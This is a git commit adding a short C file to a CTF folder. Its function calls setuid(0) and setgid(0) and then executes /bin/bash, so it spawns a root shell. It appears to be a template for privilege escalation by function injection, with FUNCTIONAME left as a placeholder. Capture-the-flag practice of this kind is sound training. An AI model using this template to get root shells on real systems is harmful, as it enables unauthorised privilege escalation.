4996ce52a06c8dfbab15d10f5f826670aa26d029
Taz Wake <26778008+TazWake@users.noreply.github.com>
2018-09-08 10:45:13 +0100

    Create function-injection.c

---
+++ CTFS/function-injection.c
@@ -0,0 +1,14 @@
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+void seclogin()
+{
+        setuid(0);
+        setgid(0);
+        execl("/bin/bash","sh",(char *)0);
+}
+int main(void)
+{
+        FUNCTIONAME();
+}
